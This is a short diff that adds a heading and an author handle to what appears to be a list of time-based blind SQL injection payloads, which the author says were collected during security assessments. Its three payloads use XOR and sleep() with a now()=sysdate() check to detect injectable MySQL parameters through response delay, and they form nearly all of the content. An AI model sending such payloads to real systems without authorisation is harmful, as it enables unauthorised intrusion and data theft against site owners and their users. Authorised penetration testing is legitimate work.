@@ -1,3 +1,11 @@
+TimeBased SQLi payloads list!
+
+I will update this with useful payloads that i found during my security assessments
+
+@b1tm4r
+--
+
+```
 0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
 1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
